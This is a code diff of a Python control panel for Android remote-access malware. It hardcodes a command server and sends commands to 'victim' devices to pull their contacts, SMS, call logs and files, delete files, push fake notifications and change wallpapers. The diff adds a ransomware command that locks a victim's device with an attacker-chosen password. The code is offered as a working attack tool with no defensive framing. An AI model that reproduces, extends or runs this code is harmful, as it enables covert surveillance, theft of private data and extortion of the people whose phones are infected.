@@ -3,7 +3,7 @@ import os, threading,sys
 import time
 import urllib
 
-
+url = "http://mindrecoded.com"
 def slave():
     URL = url + ("/slave.php")
     response = urllib.urlopen(URL)
@@ -16,7 +16,7 @@ def getuserip():
         data = response.read()
         return data
 
-print """
+print ("""
 _________________________________________________________________________________
 ______________________           ________                                       |
 \__    ___/\_   _____/____ ______\______ \_______  ____ ______                  |
@@ -27,10 +27,8 @@ ______________________           ________                                       
 DOnt forget to like our facebook page for updates and more tools                |
                                       https://www.facebook.com/script1337       |
 ________________________________________________________________________________|                                                
-"""
-
-url = raw_input("\nEnter your website url here = ")
-print "User ip: "+getuserip()+ "\nType help to get all command list"
+""")
+print ("User ip: "+getuserip()+ "\nType help to get all command list")
 
 def loading():
     n = 100
@@ -41,31 +39,18 @@ def loading():
         sys.stdout.flush()
     sys.stdout.write('\r' + 'loading... finished               \n')
 
-def get_platform():
-    platforms = {
-        'linux1': 'Linux',
-        'linux2': 'Linux',
-        'win32': 'Windows'
-    }
-    if sys.platform not in platforms:
-        return sys.platform
-
-    return platforms[sys.platform]
 
 def help():
-    print """
+    print ("""
     commands results
     
     ls       list of all victims
+    set      set target ex : set 1234        (1234 = target userid)
     getcon   get all contacts from user android device
     getsms   get all sms from user android device
     getcalllogs  get all call history
     getfileloc   get all files path
-	getfile      Downlaod any file from victim device
-	sendnoti     send fake notification to victim
-	delelet      delelet any file from victim device
-	chngwal      change victim wallpaper
-    """
+    """)
 
 def getcon():
     id = raw_input("Please Enter victim id = ")
@@ -142,7 +127,7 @@ def getfile():
     print("DOwnloaded files location "+cwd +"\\"+os.path.basename(vicp))
 def sendnoti():
     id = raw_input("Please Enter victim id = ")
-    vicp = raw_input("Enter what you want to show in notification = ")
+    vicp = raw_input("Enter what you want to show in notification")
     ds = url + "/injectfile.php?command=" + vicp
     f = requests.get(ds)
     link = url + "/addcommand.php?id=" + id + "&command=nofi"
@@ -166,6 +151,18 @@ def chngwal():
     link = url + "/addcommand.php?id=" + id + "&command=chwl"
     r = requests.get(link)
     print (r.text)
+
+def ransomattack():
+    id = raw_input("Please Enter victim id = ")
+    vicp = raw_input("\nEnter a password for Ransomware = ")
+    ds = url + "/injectfile.php?command=" + vicp
+    f = requests.get(ds)
+    print(f.text)
+    link = url + "/addcommand.php?id=" + id + "&command=rnsm"
+    r = requests.get(link)
+    print(r.text)
+    loading()
+    print("attack successfull motherfucker")
 
 def start():
     while True:
@@ -195,11 +192,11 @@ def start():
             delelet()
         elif 'change' in cmd:
             chngwal()
+        elif 'ransomattack' in cmd:
+            ransomattack()
         else:
-            print "command not found :( "
+            print ("command not found :( ")
 
 t = threading.Thread(target=start(), name='start')
 t.start()
-
-
 
